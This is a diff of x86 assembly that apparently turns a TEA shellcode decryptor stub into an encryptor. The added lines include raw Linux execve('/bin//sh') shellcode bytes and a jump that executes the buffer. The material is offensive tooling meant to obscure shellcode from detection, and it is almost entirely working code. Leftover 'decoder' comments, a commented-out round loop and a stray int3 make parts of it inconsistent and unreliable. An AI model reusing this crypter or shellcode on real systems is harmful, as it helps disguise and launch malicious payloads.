@@ -28,37 +28,19 @@ key_loader:
 	pop edi								; load address of our key into EDI (JMP CALL POP trick)
 	jmp short shellcode_section			; goto shellcode_section
 
-decoder:								; decoder
-	pop esi								; load address of our encrypted_shellcode into ESI (JMP CALL POP trick)
+encoder:								; encoder
+	pop esi								; load address of our shellcode into ESI (JMP CALL POP trick)
 	mov ecx, 3							; load the number of our shellcode chunks, used to loop. (shellcode length is 24. 24/4(DWORD)=6 blocks/2(chunks taken 2by 2)=3)
 
-decrypt_loop:
+encrypt_loop:
 	;push ecx							; save counter status before entering 32 iteration loop
     ;mov ecx, 32							; store loop counter, we nedd to cycle x32 times
-	mov edx, 0xC6EF3720					; EDX = sum
+	mov edx, 0x9E3779B9					; EDX = delta
 	loop_32:
-		mov ebx, dword [esi]			; v0 load encrypted_shellcode's chunk DWORD pointed by ESI in EBX | EBX=A
-		; v1 = v1-((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3)
-		mov eax, ebx					; v0 is now in EAX
-		shl eax, 4						; v0<<4
-		add eax, dword [edi+8]			; +k2
-		push eax						; store EAX (result) on stack
-		mov eax, ebx					; v0 is now in EAX
-		add eax, edx					; v0 + sum
-		push eax						; store EAX (result) on stack
-		mov eax, ebx					; v0 is now in EAX
-		shr eax, 5						; v0>>5
-		add eax, dword [edi+12]			; +k3
-		; EAX = ((v0>>5) + k3)
-		pop ebx							; restore EBX = (v0 + sum)
-		xor eax, ebx					; EAX = (v0 + sum) ^ ((v0>>5) + k3)
-		pop ebx							; restore EBX = (v0<<4) + k2)
-		xor eax, ebx					; EAX = ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3)
-		sub eax, dword [esi+4]			; v1=v1-((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3)
-		push eax						; store decrypted v1 on stack
-		;--------------------------------------------------------------------------------------
 		mov ebx, dword [esi+4]			; v1 load encrypted_shellcode's chunk DWORD pointed by ESI in EBX | EBX=B
-		; v0 = v0-((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1)
+		; sum = sum+delta
+		add	edx, 0x9E3779B9				; sum = sum+delta
+		; v0 = v0 + ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
 		mov eax, ebx					; v1 is now in EAX
 		shl eax, 4						; v1<<4
 		add eax, dword [edi]			; +k0
@@ -74,17 +56,35 @@ decrypt_loop:
 		xor eax, ebx					; EAX = (v1 + sum) ^ ((v1>>5) + k1)
 		pop ebx							; restore EBX = (v1<<4) + k0)
 		xor eax, ebx					; EAX = ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1)
-		sub eax, dword [esi]			; v0 = v0-((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1)
-		push eax						; store decrypted v0 on stack
-		; sum = sum-delta
-		sub	edx, 0x9E3779B9				; sum = sum-delta
+		add eax, dword [esi]			; v0 = v0 + ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1)
+		push eax						; store encrypted v0 on stack
+		;--------------------------------------------------------------------------------------
+		mov ebx, dword [esi]			; v0 load shellcode's chunk DWORD pointed by ESI in EBX | EBX=A
+		; v1 = v1 + ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
+		mov eax, ebx					; v0 is now in EAX
+		shl eax, 4						; v0<<4
+		add eax, dword [edi+8]			; +k2
+		push eax						; store EAX (result) on stack
+		mov eax, ebx					; v0 is now in EAX
+		add eax, edx					; v0 + sum
+		push eax						; store EAX (result) on stack
+		mov eax, ebx					; v0 is now in EAX
+		shr eax, 5						; v0>>5
+		add eax, dword [edi+12]			; +k3
+		; EAX = ((v0>>5) + k3)
+		pop ebx							; restore EBX = (v0 + sum)
+		xor eax, ebx					; EAX = (v0 + sum) ^ ((v0>>5) + k3)
+		pop ebx							; restore EBX = (v0<<4) + k2)
+		xor eax, ebx					; EAX = ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3)
+		add eax, dword [esi+4]			; v1 = v1 + ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3)
+		push eax						; store encrypted v1 on stack
 		;loop loop_32					; ECX is 0? No, we go back at loop_32 and execute the cicle again
-	; save decrypted v0, v1
+	; save encrypted v0, v1
 	save:
-	pop eax								; EAX=v1
-	mov dword [esi+4], eax				; store decrypted v1 back to encrypted_shellcode "buffer"
 	pop eax								; EAX=v0
-	mov dword [esi], eax				; store decrypted v0 back to encrypted_shellcode "buffer"
+	mov dword [esi], eax				; store encrypted v0 back to shellcode "buffer"
+	pop eax								; EAX=v1
+	mov dword [esi+4], eax				; store encrypted v1 back to shellcode "buffer"
 	; ------
 	;mov ecx, 62							; for every loop_32 cicle I've saved v0,v1 on the stack (32*2)-2(already popped)
 	;stack_clean:
@@ -93,14 +93,14 @@ decrypt_loop:
 	; ------
 	;pop ecx								; restore ECX counter status
 	add esi, 8							; select next chunk "couple"				
-    loop decrypt_loop					; ECX is 0? No, we go back at decrypt_loop and execute the cicle again
+    loop encrypt_loop					; ECX is 0? No, we go back at decrypt_loop and execute the cicle again
     exec:
 	int3
-	jmp short encrypted_shellcode		; ECX is 0! We've decrypted our shellcode and we can now directly jump into it
+	jmp short encrypted_shellcode		; ECX is 0! We've encrypted our shellcode and we can now directly jump into it
 
 shellcode_section:
-        call decoder					; goto decoder, putting encrypted_shellcode on the stack
+        call encoder					; goto decoder, putting shellcode on the stack
 		;                       |          A          |           B           |           C           |           D            |          E           |            F          |
 		;						|         ESI         |         ESI+4         |         ESI+8         |         ESI+12         |        ESI+16        |          ESI+20       |
-        encrypted_shellcode: db 0xba, 0x36, 0xc1, 0x9e, 0x4b, 0x25, 0x46, 0xd9, 0x32, 0xee, 0x17, 0xd7, 0x6d, 0x61, 0x7f, 0x2d, 0x5c, 0x37, 0xea, 0x60, 0xa7, 0xdf, 0xc6, 0x77
+        encrypted_shellcode: db 0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x87, 0xe3, 0xb0, 0x0b, 0xcd, 0x80, 0x90, 0x90, 0x90, 0x90, 0x90
 		;						|<-chunk read direction| 
